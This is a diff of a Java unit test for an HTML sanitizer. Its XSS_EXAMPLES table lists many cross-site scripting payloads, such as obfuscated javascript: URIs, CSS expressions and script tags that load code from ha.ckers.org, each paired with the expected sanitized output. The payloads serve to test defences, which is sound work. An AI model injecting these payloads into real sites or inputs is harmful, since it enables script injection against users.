@@ -49,13 +49,32 @@ public final class XHTMLTest extends TestCase {
 
         // ARRANGE
         final String raw =
-            "<html><head/><body><p><b>Hello</B> <I>World</i></p></body></html>";
+            "<html>"
+            + "<head><title>title</title></head>"
+            + "<body><p><b>Hello</B> <I>World</i></p><a>foo</a></body>"
+            + "</html>";
 
         // ACT
         final String sanitized = XHTML.sanitize(raw);
 
         // ASSERT
-        assertEquals("<p><b>Hello</b> <i>World</i></p>", sanitized);
+        assertEquals("<p><b>Hello</b> <i>World</i></p>foo", sanitized);
+    }
+
+    /**
+     * Test.
+     */
+    public void testSanitizeMarkupWithHeadContent() {
+
+        // ARRANGE
+        final String raw =
+            "<head>foo<script>bad();</script> <a>head-link</head><body />";
+
+        // ACT
+        final String sanitized = XHTML.sanitize(raw);
+
+        // ASSERT
+        assertEquals("foo head-link", sanitized);
     }
 
     /**
@@ -135,14 +154,14 @@ public final class XHTMLTest extends TestCase {
      */
     private static final String[][] XSS_EXAMPLES = {
         // TODO: Example 1.
-        {"'';!--&quot;=&amp;{()}", "'';!--\"<XSS>=&{()}"}, // FIXME: Dodgy?
+        {"'';!--&quot;", "'';!--\"<XSS>=&{()}"}, // FIXME: Dodgy?
         {"", "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"},
         {"", "<IMG SRC=\"javascript:alert('XSS');\">"},
         {"", "<IMG SRC=javascript:alert('XSS')>"},
         {"", "<IMG SRC=JaVaScRiPt:alert('XSS')>"},
         {"", "<IMG SRC=javascript:alert(&quot;XSS&quot;)>"},
         {"", "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>"},
-        {"alert(&quot;XSS&quot;)&quot;&gt;", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"}, // FIXME: Dodgy?
+        {"&quot;&gt;", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"}, // FIXME: Dodgy?
         {"", "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"},
         {"", "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"},
         {"", "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"},
@@ -153,19 +172,19 @@ public final class XHTMLTest extends TestCase {
         {"", "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">"},
         {"", "<IMG\nSRC\n=\n\"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\na\nl\ne\nr\nt\n(\n'\nX\nS\nS\n'\n)\n\"\n>"},
         {"", "<IMG SRC=java\u0000script:alert(\"XSS\")>"},
-        {"alert(&quot;XSS&quot;)", "<SCR\u0000IPT>alert(\"XSS\")</SCR\u0000IPT>"}, // FIXME: Dodgy?
+        {"", "<SCR\u0000IPT>alert(\"XSS\")</SCR\u0000IPT>"},
         {"", "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"},
         {"", "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
         {"", "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"},
         {"", "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
-        {"alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;", "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"}, // FIXME: Dodgy?
+        {"", "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"},
         {"", "<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>"},
         {"", "<SCRIPT SRC=//ha.ckers.org/.j>"},
         {"", "<IMG SRC=\"javascript:alert('XSS')\""},
         {"", "<iframe src=http://ha.ckers.org/scriptlet.html <"},
-        {"alert(/XSS/.source)", "<SCRIPT>alert(/XSS/.source)</SCRIPT>"}, // FIXME: Dodgy?
+        {"", "<SCRIPT>alert(/XSS/.source)</SCRIPT>"},
         {"\\&quot;;alert('XSS');//", "\\\";alert('XSS');//"}, // FIXME: Dodgy?
-        {"alert(&quot;XSS&quot;);", "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>"}, // FIXME: Dodgy?
+        {"", "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>"},
         {"", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">"},
         {"", "<BODY BACKGROUND=\"javascript:alert('XSS')\">"},
         {"", "<BODY ONLOAD=alert('XSS')>"},
@@ -176,11 +195,11 @@ public final class XHTMLTest extends TestCase {
         {"", "<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>"},
         {"", "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"},
         {"", "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">"},
-        {"@import'http://ha.ckers.org/xss.css';", "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"}, // FIXME: Dodgy?
+        {"", "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"},
         {"", "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">"},
-        {"BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}", "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>"}, // FIXME: Dodgy?
+        {"", "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>"},
         {"", "<XSS STYLE=\"behavior: url(xss.htc);\">"},
-        {"li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}XSS", "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS"}, // FIXME: Dodgy?
+        {"", "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS"},
         {"", "<IMG SRC='vbscript:msgbox(\"XSS\")'>"},
         {"", "<IMG SRC=\"mocha:[code]\">"},
         {"", "<IMG SRC=\"livescript:[code]\">"},
@@ -196,19 +215,52 @@ public final class XHTMLTest extends TestCase {
         {"", "<DIV STYLE=\"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029\">"},
         {"", "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">"},
         {"", "<DIV STYLE=\"width: expression(alert('XSS'));\">"},
-        {"@im\\port'\\ja\\vasc\\ript:alert(&quot;XSS&quot;)';", "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"}, // FIXME: Dodgy?
+        {"", "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"},
         {"", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">"},
         {"", "<XSS STYLE=\"xss:expression(alert('XSS'))\">"},
         {"exp/*", "exp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>"},
-        {"alert('XSS');", "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>"}, // FIXME: Dodgy?
-        {".XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}", "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"}, // FIXME: Dodgy?
-        {"BODY{background:url(&quot;javascript:alert('XSS')&quot;)}", "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>"},
+        {"", "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>"},
+        {"", "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"},
+        {"", "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>"},
         {"", "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->"},
         {"", "<BASE HREF=\"javascript:alert('XSS');//\">"},
         {"", "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>"},
         {"", "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>"},
         {"", "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>"},
         {"", "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"},
-        {"XSS", "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></HTML>"},
+        {"", "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></HTML>"},
+        {"", "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"},
+        {"", "<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></XML><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>"},
+        {"", "<XML SRC=\"xsstest.xml\" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"},
+        {"", "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"></BODY></HTML>"},
+        {"", "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>"},
+        {"", "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">"},
+        {"+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-", "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"},
+        {"", "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"", "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"", "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"", "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"", "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"", "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;", "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"},
+        {"XSS", "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://1113982867/\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>"},
+        {"XSS", "<A HREF=\"htt\tp://6&#9;6.000146.0x7.147/\">XSS</A>"},
+        {"XSS", "<A HREF=\"//www.google.com/\">XSS</A>"},
+        {"XSS", "<A HREF=\"//google\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://ha.ckers.org@google\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://google:ha.ckers.org\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://google.com/\">XSS</A>"},
+        {"XSS", "<A HREF=\"http://www.google.com./\">XSS</A>"},
+        {"XSS", "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>"},
     };
+
+    public static void main(final String[] args) {
+        System.out.print(
+            XHTML.fix(
+                "<head>foo <a>head-link<script>bad();</script></head><body />")
+        );
+    }
 }
